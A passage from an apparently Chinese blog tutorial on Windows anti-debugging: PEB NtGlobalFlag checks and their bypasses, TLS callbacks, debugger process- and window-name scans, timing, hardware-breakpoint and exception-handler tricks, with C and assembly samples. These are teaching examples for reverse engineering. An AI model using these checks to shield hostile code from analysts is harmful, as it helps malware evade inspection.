位的代码在 64 位机器上的检测代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push 60h</span><br><span class="line">pop rsi</span><br><span class="line">gs:lodsq                ;Process Environment Block</span><br><span class="line">mov al, [rsi*2+rax-14h] ;NtGlobalFlag</span><br><span class="line">and al, 70h</span><br><span class="line">cmp al, 70h</span><br><span class="line">je being_debugged</span><br></pre></td></tr></table></figure><p>要注意的是, 如果是一个 32 位程序在 64 位机器上运行, 那么实际上会存在两个 PEB: 一个是 32 位部分的而另一个是 64 位. 64 位的 PEB 的对应字段也会像在 32 位的那样而改变.</p><p>于是我们就还有以下的, 用 32 位的代码检测 64 位机器环境:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov eax, fs:[30h] ; Process Environment Block</span><br><span class="line">;64-bit Process Environment Block</span><br><span class="line">;follows 32-bit Process Environment Block</span><br><span class="line">mov al, [eax+10bch] ;NtGlobalFlag</span><br><span class="line">and al, 70h</span><br><span class="line">cmp al, 70h</span><br><span class="line">je being_debugged</span><br></pre></td></tr></table></figure><p>过检测方法：</p><p>有以下 3 种方法来绕过<code>NtGlobalFlag</code>的检测</p><ul><li>手动修改标志位的值 (<code>FLG_HEAP_ENABLE_TAIL_CHECK</code>, <code>FLG_HEAP_ENABLE_FREE_CHECK</code>, <code>FLG_HEAP_VALIDATE_PARAMETERS</code>)</li><li>在 Ollydbg 中使用<code>hide-debug</code>插件</li><li>在 Windbg 禁用调试堆的方式启动程序 (<code>windbg -hd program.exe</code>)</li></ul><p>在PEB结构体中中，<code>BeingDebugged</code>、<code>ProcessHeap</code>、<code>NtGlobalFlag</code>是与调试信息相关的三个重要成员。</p><ul><li><code>BeingDebugged</code>:当进程处于被调试状态时，值为1，否则为0。</li><li><code>ProcessHeap</code>:指向Heap结构体，偏移0xC处为Flags成员，偏移0x10处为ForceFlags成员。通常情况下，Flags的值为2.ForceFlags的值为0，当进程被调试时会发生改变</li><li><code>NGlobalFlag</code>:占四个字节，默认值为0。当进程处于被调试状态时，第一个字节会被置为0x70。</li></ul><p>通过<code>FS.Base</code>能够定位到<strong>TEB</strong>，再通过TEB+0x30能够定位<strong>PEB</strong>。通过在内存中检测或修改相关成员的值，便可达到反试、反反调试的效果。</p><h2 id="TLS反调试"><a href="#TLS反调试" class="headerlink" title="TLS反调试"></a>TLS反调试</h2><p><a href="https://bbs.kanxue.com/thread-267175.htm">[原创]TLS回调函数(Note)-软件逆向-看雪论坛-安全社区|非营利性质技术交流社区</a></p><p><strong>TLS (Thread Local Storage)<strong>，即线程局部存储是Windows提供的一种处理机制，每进行一次线程切换，便会调用一次</strong>TLS</strong>回调。它本意是想给每个线程都提供访问全局变量的机会。例如，需要统计当前程序进行了多少次线程切换，但并不想让其他线程访问到这个计数变量，使用<strong>TLS</strong>进行计数，便能够解决这个问题，一个程序能设置多个<strong>TLS</strong>.</p><p>TLS 回调是 PE 格式里的一个机制：加载器在初始化模块并在调用 <code>EntryPoint</code>（或 <code>DllMain</code>）前，会先调用注册在 PE 的 TLS Directory 中的一组函数（回调）。因此这些回调在程序入口之前就会执行——这是它被用作反调试、反分析、解密解包的原因。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// TLS回调函数定义</span></span><br><span class="line"><span class="type">void</span> NTAPI <span class="title function_">TLS_Callback</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (Reason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        <span class="comment">// 检测是否存在调试器</span></span><br><span class="line">        <span class="keyword">if</span> (IsDebuggerPresent()) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Debugger detected!\n&quot;</span>;</span><br><span class="line">            ExitProcess(<span class="number">1</span>);  <span class="comment">// 如果检测到调试器则退出</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;No debugger detected.\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明TLS回调函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _MSC_VER</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg(<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line">EXTERN_C <span class="type">const</span> PIMAGE_TLS_CALLBACK pTLS_CALLBACK = TLS_Callback;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">__attribute__((section(<span class="string">&quot;.CRT$XLB&quot;</span>))) PIMAGE_TLS_CALLBACK pTLS_CALLBACK = TLS_Callback;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Program started.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>TLS_Callback</code>：TLS的回调函数，每当一个新线程创建时，或者进程加载时，它都会被调用。</li><li><code>IsDebuggerPresent</code>：这是Windows提供的API，用来检查当前进程是否被调试。</li><li><code>#pragma const_seg</code>：用于指定TLS回调函数的位置，它被放在<code>.CRT$XLB</code>节中，这样Windows在加载时会自动执行。</li><li>也可以加PEB反调试</li></ul><p>tls函数的第一个参数表示模块句柄，第二个参数表示调用TLS回调函数的原因。</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251007141000563.png" alt="image-20251007141000563"></p><p>分析：</p><p>在创建主线程的时候，就调用了回调函数，此时的调用Reason就是1</p><p>然后创建子线程的时候，此时又调用了回调函数，此时的调用Reason就是2</p><p>之后子线程执行完毕，调用回调函数，调用Reason就是3</p><p>最后主线程执行完毕，调用回调函数，调用原因是0</p><h2 id="进程名反调试"><a href="#进程名反调试" class="headerlink" title="进程名反调试"></a>进程名反调试</h2><p>当使用调试器调试程序时，调试器是一个独立的进程，运行在内存中。若在程序执行到某一反调试方法。阶段时遍历当前系统中的进程列表，检测是否存在与调试器相关的进程名，也不失为一种可行的方法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否存在指定的调试器进程</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">IsDebuggerProcessRunning</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* debuggerNames[] = &#123; <span class="string">&quot;ollydbg.exe&quot;</span>, <span class="string">&quot;x64dbg.exe&quot;</span>, <span class="string">&quot;ida.exe&quot;</span>, <span class="string">&quot;windbg.exe&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建进程快照</span></span><br><span class="line">    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PROCESSENTRY32 pe32;</span><br><span class="line">    pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历进程列表</span></span><br><span class="line">    <span class="keyword">if</span> (Process32First(hSnapshot, &amp;pe32)) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">// 遍历已知的调试器名称</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; debuggerName : debuggerNames) &#123;</span><br><span class="line">                <span class="comment">// 将进程名转换为小写以进行匹配</span></span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">string</span> processName = pe32.szExeFile;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; c : processName) c = <span class="built_in">tolower</span>(c);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (processName == debuggerName) &#123;</span><br><span class="line">                    CloseHandle(hSnapshot);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">// 找到匹配的调试器进程</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (Process32Next(hSnapshot, &amp;pe32));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CloseHandle(hSnapshot);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">// 未找到调试器进程</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (IsDebuggerProcessRunning()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Debugger process detected! Exiting...\n&quot;</span>;</span><br><span class="line">        ExitProcess(<span class="number">1</span>);  <span class="comment">// 检测到调试器，退出程序</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;No debugger detected.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 正常程序逻辑</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Program is running.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="窗口名反调试"><a href="#窗口名反调试" class="headerlink" title="窗口名反调试"></a>窗口名反调试</h2><p>检测已打开窗口的窗口也是一种较为常用的反调试手段。示例代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义要检查的调试器窗口名称</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* debuggerWindowNames[] = &#123;</span><br><span class="line">    <span class="string">&quot;OllyDbg&quot;</span>,  <span class="string">&quot;x64dbg&quot;</span>, <span class="string">&quot;IDA&quot;</span>, <span class="string">&quot;WinDbg&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 枚举系统中所有窗口，查找是否有调试器窗口存在</span></span><br><span class="line">BOOL CALLBACK <span class="title function_">EnumWindowsProc</span><span class="params">(HWND hwnd, LPARAM lParam)</span> &#123;</span><br><span class="line">    <span class="type">char</span> windowTitle[<span class="number">256</span>];</span><br><span class="line">    GetWindowTextA(hwnd, windowTitle, <span class="keyword">sizeof</span>(windowTitle));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历已知的调试器窗口名称</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; debuggerWindowName : debuggerWindowNames) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(windowTitle, debuggerWindowName)) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Debugger window detected: &quot;</span> &lt;&lt; windowTitle &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> FALSE;  <span class="comment">// 找到调试器窗口，停止枚举</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;  <span class="comment">// 继续枚举其他窗口</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否存在调试器窗口</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">IsDebuggerWindowOpen</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> !EnumWindows(EnumWindowsProc, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (IsDebuggerWindowOpen()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Debugger window detected! Exiting...\n&quot;</span>;</span><br><span class="line">        ExitProcess(<span class="number">1</span>);  <span class="comment">// 检测到调试器窗口，退出程序</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;No debugger window detected.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Program is running.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><strong>EnumWindows</strong>：这是Windows API，允许遍历系统中所有的顶层窗口。每找到一个窗口，就会调用回调函数<code>EnumWindowsProc</code>。</li><li><strong>EnumWindowsProc</strong>：这是枚举窗口的回调函数。通过<code>GetWindowTextA</code>函数获取窗口标题，然后使用<code>strstr</code>来判断窗口名是否包含已知调试器窗口名称。</li><li><strong>ExitProcess</strong>：如果检测到调试器窗口，程序直接退出。</li></ul><h2 id="时间戳反调试"><a href="#时间戳反调试" class="headerlink" title="时间戳反调试"></a>时间戳反调试</h2><p>正常情况下，CPU的执行速度是非常快的，每秒能执行数条指令，每条指令的执行时间非常短。而在调试状态下，由于软件中断、单步调试等因素，可能会造成指令间的执行间隔远大于正常时间，分别记录两条指令执行前后的时间戳，利用时间戳的差值便能够判断当前进程是否处于被调试状态。</p><p>时间戳反调试有三种常用手段。</p><ul><li><code>rdtsc</code>: 汇编指令，能够以纳秒级记录系统启动以来的时间戳，返回值保存在<strong>EDX:EAX</strong>(高位保存到<strong>EDX</strong>，低位保存到<strong>EAX</strong>)中。</li><li><code>QueryPerformanceCounter</code>:能够以微秒为单位高精度计时。</li><li><code>GetTickCount</code>:返回值为自系统启动以来所经过的毫秒数。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    DWORD time1 = GetTickCount();</span><br><span class="line">    <span class="type">int</span> result, a = <span class="number">1</span>, b = <span class="number">2</span>;</span><br><span class="line">    __asm(</span><br><span class="line">            <span class="string">&quot;movl %1, %%ebx\n\t&quot;</span></span><br><span class="line">            <span class="string">&quot;addl %%ebx, %0&quot;</span></span><br><span class="line">            : <span class="string">&quot;=r&quot;</span> (result)</span><br><span class="line">            : <span class="string">&quot;r&quot;</span> (b), <span class="string">&quot;0&quot;</span> (a)</span><br><span class="line">            );</span><br><span class="line">    DWORD time2 = GetTickCount();</span><br><span class="line">    <span class="keyword">if</span>(time2-time1&gt;<span class="number">0x10</span>)</span><br><span class="line">        ExitProcess(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Program started.\n&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; result;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序执行完内联汇编后，会计算前后时间差。如果时间差超过16毫秒（0x10），程序会调用<code>ExitProcess</code>强制退出。这可以用于反调试：调试器往往会减缓程序的执行速度，因此通过这种时间检测方法可以检测到调试行为。</p><h2 id="硬件断点检测反调试"><a href="#硬件断点检测反调试" class="headerlink" title="硬件断点检测反调试"></a>硬件断点检测反调试</h2><p>硬件断点是调试器常用的手段之一，它通过CPU的调试寄存器（如<code>DR0-DR7</code>）设置断点。可以通过检查这些寄存器是否有断点设置来检测调试器。使用<code>GetThreadContext</code> API来获取当前线程的上下文，检查调试寄存器（<code>DR0</code>到<code>DR3</code>）是否设置断点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONTEXT ctx = &#123;&#125;;</span><br><span class="line">ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;</span><br><span class="line">GetThreadContext(GetCurrentThread(), &amp;ctx);</span><br><span class="line"><span class="keyword">if</span> (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) &#123;</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用<code>GetThreadContext</code>获取上下文，检查硬件断点寄存器的值是否为0</p><p><strong>软断点</strong></p><p>一条常见的指令</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x44332211:    8BC3    MOV EAX, EBX</span><br><span class="line">#指令地址      操作码     汇编指令</span><br></pre></td></tr></table></figure><p>为了在此设置一个软断点，使得 CPU 执行到此能够停止，没错，需要中断指令 INT。这里采用的方式是将双字节操作码替换为 INT3 中断指令(0xCC)，设置成为断点后：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x44332211:    CCC3    MOV EAX, EBX</span><br><span class="line">#指令地址      操作码     汇编指令</span><br></pre></td></tr></table></figure><p>注意这里操作码发生了变化</p><p>但是需要注意一个问题，当你修改了可执行程序的某个字节数据后，也就改变了他的 CRC（循环冗余校验）值。CRC 用于校验一个程序是否被篡改，一些程序会在程序执行前检验程序是否被篡改，还有一些软件往往会检测自己在内存中运行代码的 CRC，一旦检测被篡改就会立即自行崩溃，这是一个有效防御软断点的技术。</p><p><strong>硬件断点</strong></p><p>硬件断点是通过位于 CPU 上的一组特殊寄存器来实现的，称为调试寄存器。比如 x86 架构的 CPU 上有 8 个调试寄存器，分别用于设置和管理硬件断点。</p><ul><li>DR0-DR3 负责存储硬件断点的内存地址，所以最多只能同时使用 4 个硬件断点。</li><li>DR4 和 DR5 保留使用。</li><li>DR6为调试状态寄存器，记录上一次断点触发所产生的调试事件类型信息。</li><li>DR7 是硬件断点的激活开关，存储着各个断点的触发信息条件。 与软断点不同的是，硬件断点使用 1 号中断（INT1）实现，INT1 一般被用于硬件断点和单步事件。</li></ul><p>CPU 每次试图执行一条指令时，都会首先检查当前指令所在地址是否被设置了有效的硬件断点，除此之外还会检查当前指令包含的操作数是否位于被设置了硬件断点的内存地址。</p><p><strong>内存断点</strong></p><p>内存断点本质上不是一个真正的断点。当调试器设置一个内存断点时，实际上是改变一个内存区域或一个内存页的权限。操作系统对内存页会设置访问权限，可执行、可读、可写、保护页，这些访问权限可以组合。</p><h2 id="异常处理反调试"><a href="#异常处理反调试" class="headerlink" title="异常处理反调试"></a>异常处理反调试</h2><p>调试器通常会捕获异常，反调试技术可以通过故意引发异常并检查其处理方式来检测调试器。通过引发<code>INT 3</code>指令（断点中断）或其他异常（如除零异常），查看是否有异常处理程序被插入，然后使用<code>SetUnhandledExceptionFilter</code>设置自定义的异常处理程序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__try &#123;</span><br><span class="line">    __asm &#123; <span class="type">int</span> <span class="number">3</span> &#125;  <span class="comment">// 触发断点异常</span></span><br><span class="line">&#125; __except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">    <span class="comment">// 如果捕获了异常，则说明没有调试器</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;No debugger detected.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序 <code>RaiseException</code> &#x2F; <code>__asm int 3</code> &#x2F; 故意执行非法指令，然后在自己的 VEH&#x2F;SEH 中捕获并设置某标志。</p><p>如果调试器拦截并处理异常（在 first-chance 阶段），用户的 handler 可能不会被调用 → 程序可据此判断“被调试”。</p><p>插入 <code>INT3</code> 或触发 <code>STATUS_SINGLE_STEP</code>，调试器与程序对这些事件的处理不同（调试器可能暂停、显示用户界面等）。</p><p><strong>Windows 下重要概念（简短）</strong></p><ul><li><strong>First-chance &#x2F; Second-chance</strong>：异常首先作为 first-chance 通知给调试器。调试器若处理并继续，程序的用户态 handler 可能就不会看到异常。第二次（未处理）称为 second-chance，会导致程序崩溃或被调试器捕获。</li><li><strong>SEH（x86）链</strong>：传统的结构化异常链（x86 上链表存放于 <code>FS:[0]</code>）。x64 的 SEH 实现为表格；但 VEH 在 x86&#x2F;x64 都有效。</li><li><strong>VEH（Vectored Exception Handler）</strong>：通过 <code>RtlAddVectoredExceptionHandler</code> &#x2F; <code>AddVectoredExceptionHandler</code> 注册，优先于 SEH 被调用（可返回 CONTINUE_EXECUTION）。</li><li><strong>UnhandledExceptionFilter &#x2F; SetUnhandledExceptionFilter</strong>：未被捕获异常的最后处理点，可被修改或 hook。</li></ul><p>VEH</p><ol><li>CPU捕获异常</li><li>通过<code>KiDispatchException</code>进行分发(3环异常将EIP修改为KiUserExceptionDispatcher)</li><li><code>KiUserExceptionDispatcher</code>调用RtlDispatchException</li><li><code>RtlDispatchException</code>查找<code>VEH</code>处理函数链表，并调用相关处理函数</li><li>代码返回到<code>ZwContinue</code>再次进入0环</li><li>线程再次返回3环后，从修正的位置开始执行</li></ol><p>SEH</p><ol><li><p>FS:[0]指向SEH链表的第一个成员</p></li><li><p>SEH的异常处理函数必须在当前线程的堆栈中</p></li><li><p>只有当VEH中的异常处理函数不存在或者不处理才会到SEH链表中查找</p></li></ol><p><strong>VEH</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">volatile</span> LONG g_flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">LONG WINAPI <span class="title function_">MyVeh</span><span class="params">(EXCEPTION_POINTERS *ep)</span> &#123;</span><br><span class="line">    <span class="comment">// 我们只处理特定异常码</span></span><br><span class="line">    <span class="keyword">if</span> (ep-&gt;ExceptionRecord-&gt;ExceptionCode == <span class="number">0xDEADBEEF</span>) &#123;</span><br><span class="line">        <span class="comment">// 标记表示 handler 执行过</span></span><br><span class="line">        InterlockedExchange(&amp;g_flag, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 跳过异常，继续执行</span></span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 注册 VEH</span></span><br><span class="line">    PVOID h = AddVectoredExceptionHandler(<span class="number">1</span>, MyVeh);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 触发自定义软件异常</span></span><br><span class="line">    g_flag = <span class="number">0</span>;</span><br><span class="line">    RaiseException(<span class="number">0xDEADBEEF</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果调试器在 first-chance 阶段拦截并继续（或改变处理），可能导致 g_flag == 0</span></span><br><span class="line">    <span 